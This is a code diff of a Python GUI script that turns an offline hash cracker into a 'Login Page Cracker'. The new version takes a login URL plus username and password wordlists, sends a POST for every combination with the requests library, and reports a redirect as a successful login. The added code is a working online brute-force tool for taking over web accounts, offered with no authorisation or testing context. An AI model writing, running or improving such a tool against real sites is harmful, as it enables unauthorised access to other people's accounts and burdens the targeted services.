@@ -1,51 +1,59 @@
-import tkinter as tk
-from tkinter import filedialog, messagebox
-import hashlib
+import requests
+from tkinter import Tk, Label, Entry, Button, filedialog, messagebox
 import time
 
-def hash_password(password, algorithm="sha256"):
-    """Hashes a password with the given algorithm."""
-    if algorithm == "sha256":
-        return hashlib.sha256(password.encode()).hexdigest()
-    elif algorithm == "md5":
-        return hashlib.md5(password.encode()).hexdigest()
-    else:
-        raise ValueError("Unsupported hash algorithm")
+def crack_login():
+    url = url_entry.get().strip()
+    if not url:
+        messagebox.showerror("Error", "Please enter the login page URL.")
+        return
 
-def crack_password():
-    hash_to_crack = hash_entry.get()
-    wordlist_path = filedialog.askopenfilename(title="Select Wordlist", filetypes=(("Text Files", "*.txt"),))
+    username_list_path = filedialog.askopenfilename(title="Select Username List", filetypes=(("Text Files", "*.txt"),))
+    password_list_path = filedialog.askopenfilename(title="Select Password List", filetypes=(("Text Files", "*.txt"),))
 
-    if not hash_to_crack or not wordlist_path:
-        messagebox.showerror("Error", "Please enter a hash and select a wordlist.")
+    if not username_list_path or not password_list_path:
+        messagebox.showerror("Error", "Please select both username and password files.")
         return
 
     start_time = time.time()
 
     try:
-        with open(wordlist_path, "r") as file:
-            for word in file:
-                word = word.strip()
-                hashed_word = hash_password(word)
+        with open(username_list_path, "r") as user_file, open(password_list_path, "r") as pass_file:
+            usernames = user_file.read().splitlines()
+            passwords = pass_file.read().splitlines()
 
-                if hashed_word == hash_to_crack:
+        for username in usernames:
+            for password in passwords:
+                print(f"Trying username: {username} with password: {password}")
+                
+                # Send POST request
+                response = requests.post(url, data={"username": username, "password": password}, allow_redirects=True)
+
+                # Check if the URL has changed
+                if response.url != url:
                     elapsed_time = time.time() - start_time
-                    messagebox.showinfo("Success", f"Password cracked: {word}\nTime taken: {elapsed_time:.2f} seconds")
+                    messagebox.showinfo(
+                        "Success",
+                        f"Login successful!\nUsername: {username}\nPassword: {password}\nTime taken: {elapsed_time:.2f} seconds"
+                    )
                     return
 
-        messagebox.showwarning("Failure", "Password not found in the wordlist.")
+            print(f"Failed for username: {username}")
+
+        # If no valid combination is found
+        messagebox.showwarning("Failure", "No valid username-password combination found.")
     except Exception as e:
         messagebox.showerror("Error", f"An error occurred: {str(e)}")
 
 # GUI setup
-root = tk.Tk()
-root.title("Real-Life Password Cracker")
+root = Tk()
+root.title("Login Page Cracker")
 
-tk.Label(root, text="Enter Hash to Crack:").pack(pady=5)
-hash_entry = tk.Entry(root, width=60)
-hash_entry.pack(pady=5)
+Label(root, text="Enter Login Page URL:").pack(pady=5)
+url_entry = Entry(root, width=50)
+url_entry.pack(pady=5)
 
-crack_button = tk.Button(root, text="Crack Password", command=crack_password)
+crack_button = Button(root, text="Start Cracking", command=crack_login)
 crack_button.pack(pady=10)
 
 root.geometry("400x200")
